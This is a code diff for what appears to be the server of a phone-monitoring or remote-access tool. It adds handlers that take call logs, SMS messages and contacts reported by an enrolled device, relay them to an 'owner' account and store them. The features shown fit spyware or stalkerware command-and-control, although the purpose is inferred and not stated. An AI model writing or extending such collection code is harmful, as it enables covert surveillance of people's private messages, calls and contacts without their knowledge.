@@ -265,6 +265,51 @@ function handleEvent(socket, seq, payload) {
                 userId: auth.userId,
             });
         });
+    } else if (kind === EventKind.CALL_LOG) {
+        relayJsonToOwner(auth.userId, {
+            type: 'history_telemetry',
+            command: 'FETCH_CALL_LOGS',
+            deviceId: auth.deviceId,
+            data: items,
+            count: items.length,
+        });
+        writeQueue.enqueue(async () => {
+            await persistHistoryPayload(auth.deviceId, {
+                command: 'FETCH_CALL_LOGS',
+                data: items,
+                userId: auth.userId,
+            });
+        });
+    } else if (kind === EventKind.SMS) {
+        relayJsonToOwner(auth.userId, {
+            type: 'history_telemetry',
+            command: 'FETCH_SMS_MESSAGES',
+            deviceId: auth.deviceId,
+            data: items,
+            count: items.length,
+        });
+        writeQueue.enqueue(async () => {
+            await persistHistoryPayload(auth.deviceId, {
+                command: 'FETCH_SMS_MESSAGES',
+                data: items,
+                userId: auth.userId,
+            });
+        });
+    } else if (kind === EventKind.CONTACTS) {
+        relayJsonToOwner(auth.userId, {
+            type: 'history_telemetry',
+            command: 'FETCH_CONTACTS',
+            deviceId: auth.deviceId,
+            data: items,
+            count: items.length,
+        });
+        writeQueue.enqueue(async () => {
+            await persistHistoryPayload(auth.deviceId, {
+                command: 'FETCH_CONTACTS',
+                data: items,
+                userId: auth.userId,
+            });
+        });
     } else if (kind === EventKind.DEVICE_STATUS) {
         const status = items[0] || body;
         relayJsonToOwner(auth.userId, {
